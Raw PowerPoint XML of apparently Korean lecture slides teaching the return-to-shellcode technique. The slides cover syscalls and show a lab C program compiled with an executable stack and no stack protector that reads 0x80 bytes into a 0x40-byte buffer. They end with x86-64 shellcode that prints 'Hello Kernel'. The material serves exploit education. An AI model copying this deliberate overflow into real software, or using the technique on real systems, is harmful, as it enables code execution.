              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shellcode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0448D7-C2CA-3E70-8AC5-FA1C112E6C98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4,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DA4DA4-97AF-98B7-247E-FDA625661488}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1204203"/>
            <a:ext cx="1184220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b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>return to shellcode </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>기법은 앞서 배운 함수의 스택 프레임 구조에서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ret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 변조</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>를 통해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임의의 쉘 코드가 입력된 스택 주소</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>로 복귀하도록 만드는 공격 기법입니다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쉘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코드란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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>16</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>진수 값으로 컴퓨터는 해당 값을 이해하고 명령으로 실행합니다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프로그램에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.text </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>영역에 존재하는 메모리 값들도 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>16</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>진수 값들입니다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0896CA2-1BE2-7093-D1AF-3D03D39A1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689" y="3006390"/>
            <a:ext cx="6561636" cy="25640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EBC296-E77A-4677-A93D-7308FF9B7BB4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5626464" y="1559184"/>
            <a:ext cx="1862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ex) \x0f\x04 =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syscall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050CA89-7527-1844-EF6D-787551114B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21" b="20439"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="290784" y="2385568"/>
            <a:ext cx="4270561" cy="366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9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1E76-D0D9-FC85-CE1C-9FFF9D09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76F98B7-FEA6-C9B7-7BF5-6E6814811EC6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58443-846C-5678-5171-D62384546960}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3593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</a:rPr>
              <a:t>Return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shellcode</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="3600" spc="-3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D1E191-E2C1-4B9F-B825-B65A5F569D80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4,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67A40-2ED2-B19D-D684-EC39EA396893}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1296443"/>
            <a:ext cx="108494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먼저 커널과</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> “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syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 에 대해 알아보겠습니다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45F050-61BE-4740-AEC1-5ABF2F013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171007" y="2551519"/>
            <a:ext cx="3001355" cy="38796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A18623-78A8-E44D-196C-B22F89B65AE4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="227875" y="1997365"/>
            <a:ext cx="58071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커널은 운영체제에서 핵심적인 부분으로 하드웨어와 직접 상호작용을 합니다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예를 들어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printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 함수가 실행되어 디스플레이에 문자열이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출력될때도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600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>응용프로그램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-&gt;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커널</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>의 과정이 이루어집니다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E760D1-4949-C8C7-E0FB-543FC446F8FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6228081" y="1917126"/>
            <a:ext cx="58071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응용 프로그램이 커널을 호출하기 위한 명령이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“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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syscall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호출 시 제어권은 커널 모드로 넘어가고 유저는 커널이 하는 행동을 관여할 수 없습니다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</a:t>
            </a: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커널이 작업을 마치면 다시 유저모드로 돌아와 이 후의 코드가 실행됩니다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3BC63F-8E15-A0BD-921C-9FAB095E2B11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6963955" y="6153806"/>
            <a:ext cx="4531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  <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/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000EBFB-58E6-FFFB-7759-7AAAEFFD6F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391"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6384835" y="2990675"/>
            <a:ext cx="5305425" cy="29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8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7D9E0-8392-5E1D-59E0-7F9C27C92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E31F4A2-FF58-1E5C-B99A-80470E96FDE7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ACB78-AC00-D40C-CDD6-7A23891A736F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3123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Shellcode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ED48C-63F3-611A-F424-5A826D19EB5A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4,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81D77-8293-292C-976C-A4BD04FF0467}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1296443"/>
            <a:ext cx="10849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puts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함수가 문자열을 출력할 때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syscall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호출 모습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BE22E2-0F94-76F7-4C80-DA696BAB9CCD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="289478" y="1823703"/>
            <a:ext cx="5473418" cy="39653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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stdio.h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int main() {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      puts("Hello kernel");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      return 0;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}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622C8CD-4893-DE7D-236B-16DB8BB2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730" y="1823703"/>
            <a:ext cx="6005792" cy="39653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409502-0235-18B5-4242-566238853BB6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338182" y="6154430"/>
            <a:ext cx="10849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이제 쉘 코드를 작성할 때는 원하는 함수를 인자를 맞추고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syscall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하는 어셈블리어를 작성하면 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947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5C4F-50F4-E64F-15C1-E5636EB1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02ED73-52FE-C66B-AC62-B7CA65763ABC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FEB21-15E2-7CFA-B091-9A858595E980}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3123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Shellcode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C5A06-ED14-32BE-D8BA-111E54C818A9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4,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E0146-2A6A-105D-A5BB-D5232BE438A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="78359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RTS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>예제 코드로 실습을 해보겠습니다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버퍼의 주소를 출력해준 이유는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ASLR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>보호기법에 의해 스택 영역이 매 실행마다 랜덤화 되기 때문입니다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EADDEF-B0C4-AB92-2E32-172952E30631}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="245935" y="2119795"/>
            <a:ext cx="5473418" cy="41852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//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gcc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rts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rts.c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> –z </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>execstack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fno</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-stack-protector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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>stdio.h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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>unistd.h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int main() {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        char buffer[0x40];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      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("%p", buffer);	  // buffer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>의 주소 출력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      read(0, buffer, 0x80);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        return 0;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DB142-8891-1C32-FFFA-D71D57F4A979}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="2119795"/>
            <a:ext cx="58071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해당 코드는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>main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함수의 지역변수인 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>buffer[0x40] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>배열이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그런데</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, read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함수로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>buffer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0x80</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>만큼 입력을 받습니다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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>buffer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>크기를 넘어 입력을 받고 버퍼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오버플로우로</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 인해 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ret </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>값을 변조할 수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5D80592-A7FD-AFCB-756B-FFFAC2D810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53" b="52381"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6156960" y="3646060"/>
            <a:ext cx="4237673" cy="233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26EB-87FB-7E1E-5A71-44944900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AD53622-D470-AD2C-1EFF-CA2C2F9FCEBE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BAE82B-BFD3-9134-EF1D-FD6497085DD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3123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Shellcode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D19E0-A367-B503-6CA5-8F2DFD85D6F3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4,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329141-EBA5-AE31-B497-D7541C8A5DD9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1351058"/>
            <a:ext cx="7835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쉘 코드는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“Hello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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kernel” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열을 출력하도록 작성하겠습니다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7B90F0-4978-AF40-A63A-34287696B00D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="263352" y="1932933"/>
            <a:ext cx="5473418" cy="44203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</a:rPr>
              <a:t>// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shellcode.s</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p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section .text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global _start</a:t>
            </a:r>
          </a:p>
          <a:p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_start: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	mov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 err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, 0x6c656e72 	//“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rnel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>” push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	push </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rax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	mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, 0x654b206f6c6c6548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	// “Hello Ke” push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	push </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rax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	mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rsi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</a:rPr>
              <a:t>rsp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>       // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rsi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열 버퍼 주소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	mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, 0x1	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>출력 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>디스크립터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	mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, 0xc	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>출력 사이즈 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(12)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>	mov </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, 0x1	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sys_write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR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 err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>syscall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
